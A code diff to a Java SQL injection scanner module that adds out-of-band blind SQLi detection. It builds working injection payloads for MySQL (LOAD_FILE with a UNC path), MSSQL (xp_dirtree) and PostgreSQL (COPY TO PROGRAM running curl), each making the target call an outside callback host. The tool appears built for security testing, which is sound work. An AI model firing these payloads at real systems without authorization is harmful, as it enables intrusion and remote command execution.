@@ -7,6 +7,8 @@ import gg.effront.anarcry.model.KnowledgeBase;
 import gg.effront.anarcry.model.Severity;
 import gg.effront.anarcry.scanner.ScanContext;
 import gg.effront.anarcry.scanner.Scanner;
+import gg.effront.anarcry.scanner.oast.OastCorrelator;
+import gg.effront.anarcry.scanner.oast.OastPayload;
 import gg.effront.anarcry.scanner.util.Http;
 import gg.effront.anarcry.scanner.util.CircuitBreakerException;
 import gg.effront.anarcry.scanner.util.HttpClientFactory;
@@ -159,6 +161,8 @@ public class SqlInjectionModule implements Scanner {
 
                     // -- Phase 2: Time-Based Blind --
                     if (noTimeBased) {
+                        // Phase 3: OOB DNS exfiltration via OAST (even when time-based is skipped)
+                        injectOobSqli(ctx, hc, base, path, param, log);
                         return local;
                     }
                     long b1 = measureRtt(ctx, hc, base + path + "?" + param + "=1", log);
@@ -233,6 +237,9 @@ public class SqlInjectionModule implements Scanner {
                         } catch (Exception ignored) {
                         }
                     }
+
+                    // Phase 3: OOB DNS exfiltration via OAST (complement to time-based)
+                    injectOobSqli(ctx, hc, base, path, param, log);
                 }
                 return local;
             });
@@ -269,6 +276,61 @@ public class SqlInjectionModule implements Scanner {
             }
         }
         return List.copyOf(merged);
+    }
+
+    /**
+     * Inject OOB DNS exfiltration payloads via OAST for blind SQLi detection. These
+     * DB-specific payloads trigger DNS/HTTP lookups to the OAST callback server:
+     *
+     * <ul>
+     * <li>MySQL: {@code LOAD_FILE('\\\\<callback>\\\\<id>')} -- UNC path triggers
+     * DNS lookup
+     * <li>MSSQL: {@code xp_dirtree '\\\\<callback>\\<id>'} -- directory listing
+     * triggers DNS
+     * <li>PostgreSQL: {@code COPY ... FROM PROGRAM 'curl <callback>/<id>'} -- HTTP
+     * callback
+     * </ul>
+     */
+    private void injectOobSqli(ScanContext ctx, HttpClient hc, String base, String path, String param,
+            Consumer<String> log) {
+        OastCorrelator oast = ctx.oastCorrelator();
+        if (oast == null || oast.callbackBaseUrl().isEmpty()) {
+            return;
+        }
+        // Extract host:port from callback base URL for UNC-style payloads
+        String cbBase = oast.callbackBaseUrl();
+        String cbHost = cbBase.replaceFirst("^https?://", "").replaceFirst("/.*$", "");
+
+        // MySQL: LOAD_FILE with UNC path
+        String mysqlId = OastCorrelator.generatePayloadId();
+        String mysqlPayload = "' AND LOAD_FILE('\\\\\\\\" + cbHost + "\\\\\\\\" + mysqlId + "')-- ";
+        injectOobPayload(ctx, hc, oast, base, path, param, mysqlId, mysqlPayload, "MySQL-OOB", log);
+
+        // MSSQL: xp_dirtree with UNC path
+        String mssqlId = OastCorrelator.generatePayloadId();
+        String mssqlPayload = "'; EXEC xp_dirtree '\\\\\\\\" + cbHost + "\\\\" + mssqlId + "'-- ";
+        injectOobPayload(ctx, hc, oast, base, path, param, mssqlId, mssqlPayload, "MSSQL-OOB", log);
+
+        // PostgreSQL: COPY FROM PROGRAM with curl
+        String pgId = OastCorrelator.generatePayloadId();
+        String pgPayload = "'; COPY (SELECT 1) TO PROGRAM 'curl " + oast.callbackUrl(pgId) + "'-- ";
+        injectOobPayload(ctx, hc, oast, base, path, param, pgId, pgPayload, "PostgreSQL-OOB", log);
+    }
+
+    private void injectOobPayload(ScanContext ctx, HttpClient hc, OastCorrelator oast, String base, String path,
+            String param, String payloadId, String payload, String label, Consumer<String> log) {
+        try {
+            oast.registerPayload(
+                    new OastPayload(payloadId, id(), path + "?" + param, param, payload, System.currentTimeMillis()));
+            String encoded = URLEncoder.encode(payload, "UTF-8");
+            String url = base + path + "?" + param + "=" + encoded;
+            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(6)).GET()
+                    .build();
+            Http.send(ctx, hc, req, HttpResponse.BodyHandlers.discarding(), id());
+            log.accept("[~] SQLi: OOB payload " + label + " injetado em " + path + "?" + param);
+        } catch (Exception e) {
+            // OOB injection errors are non-fatal
+        }
     }
 
     /** Returns elapsed ms, or -1 on connection error (not timeout). */
